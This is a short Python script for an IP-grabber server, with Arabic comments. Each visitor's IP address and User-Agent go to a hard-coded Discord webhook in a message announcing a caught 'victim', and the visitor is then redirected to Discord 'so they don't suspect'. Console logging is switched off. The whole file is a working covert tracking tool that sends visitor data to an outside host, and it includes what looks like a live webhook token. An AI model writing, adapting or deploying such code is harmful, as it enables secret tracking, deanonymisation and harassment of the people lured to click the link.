import http.server
import urllib.parse
import urllib.request

WEBHOOK_URL = "https://discord.com/api/webhooks/1559968966275764296/JonlQMOdPoVFYbGl4u_LXN8f7lX6p5nEqrB-M8BQs40PpvQAvLsULK_8ZTEaqFLb8RQ9"

class GrabberHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # تنسيق الرسالة لإرسالها للرابط
        payload = f'{{"content": "🎯 **تم اصطياد ضحية عبر الرابط!**\\n🌐 **IP:** `{client_ip}`\\n💻 **Agent:** `{user_agent}`"}}'.encode('utf-8')
        
        req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
        try:
            urllib.request.urlopen(req)
        except:
            pass
        
        # إعادة توجيه الضحية لليوتيوب أو ديسكورد عشان ما يشك
        self.send_response(302)
        self.send_header('Location', 'https://discord.com')
        self.end_headers()

    def log_message(self, format, *args):
        return  # منع طباعة السجلات في الكونسول

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = http.server.HTTPServer(server_address, GrabberHandler)
    print("[+] Grabber server running on port 8080...")
    httpd.serve_forever()
